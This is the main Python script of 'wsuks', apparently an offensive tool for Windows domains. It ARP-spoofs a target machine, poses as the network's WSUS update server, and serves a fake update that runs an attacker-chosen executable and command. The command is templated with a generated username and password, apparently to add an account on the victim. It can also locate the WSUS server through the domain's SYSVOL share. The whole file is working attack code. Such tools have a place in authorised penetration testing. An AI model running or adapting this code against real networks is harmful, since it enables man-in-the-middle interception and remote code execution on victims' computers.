#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from http.server import HTTPServer
import logging
import os
from pprint import pformat
import random
from string import digits, ascii_letters
from scapy.all import get_if_addr, sniff
from wsuks.helpers.arpspoofer import ArpSpoofer
from wsuks.helpers.logger import initLogger
from wsuks.helpers.argparser import initParser, printBanner
from wsuks.helpers.sysvolparser import SysvolParser
from wsuks.helpers.wsusserver import WSUSUpdateHandler


class Wsuks:
    def __init__(self, args):
        self.logger = logging.getLogger()
        self.hostIp = get_if_addr(args.interface)
        self.username = "user" + "".join(random.choice(digits) for i in range(5))
        self.password = "".join(random.sample(ascii_letters, 16))

        # Set args
        self.targetIp = args.targetIp  # Never None (required)
        self.executable_file = args.executable.read()
        self.executable_name = os.path.basename(args.executable.name)
        args.executable.close()
        self.command = args.command.replace("WSUKS_USER", self.username).replace("WSUKS_PASSWORD", self.password)

        self.wsusIp = args.wsusIp
        self.wsusPort = args.wsusPort  # Default 8530
        self.username = args.username
        self.password = args.password
        self.domain = args.domain
        self.dcIp = args.dcIp

    def run(self):
        # Get the WSUS server IP and Port from the sysvol share
        sysvolparser = SysvolParser()
        if not self.wsusIp:
            self.logger.info("WSUS Server not specified, trying to find it in SYSVOL share on DC")
            self.wsusIp, self.wsusPort = sysvolparser.findWsusServer(self.domain, self.username, self.password, self.dcIp)
        else:
            self.logger.info(f"WSUS Server specified manually: {self.wsusIp}:{self.wsusPort}")

        # Start Arp Spoofing
        arpspoofer = ArpSpoofer()
        arpspoofer.start(self.targetIp, self.wsusIp)

        # Prepare WSUS Update Handler
        # sniff(filter="tcp and port 8530", prn=self.handlePacket, store=0)
        update_handler = WSUSUpdateHandler(self.executable_file, self.executable_name, f'{self.hostIp}:{self.wsusPort}', self.logger)
        update_handler.set_resources_xml(self.command)

        self.logger.debug(update_handler)

        # Prepare WSUS HTTP Server
        http_server = HTTPServer((self.hostIp, self.wsusPort), update_handler)
        try:
            self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
            http_server.serve_forever()
        except KeyboardInterrupt:
            print("")
            self.logger.info("Stopping WSUS Server...")
        finally:
            arpspoofer.stop()

    def handlePacket(self, packet):
        packet.show()


def main():
    # Setup
    printBanner()
    args = initParser()

    initLogger(debug=args.debug)
    logger = logging.getLogger('wsuks')
    logger.debug('Passed args:\n' + pformat(vars(args)))
    
    # Prevent scapy from logging to console
    scapyLogger = logging.getLogger('scapy')
    scapyLogger.handlers.clear()

    if os.geteuid() != 0:
        logger.error("This script must be run as root!")
        exit(1)

    wsuks = Wsuks(args)
    wsuks.run()


if __name__ == '__main__':
    main()
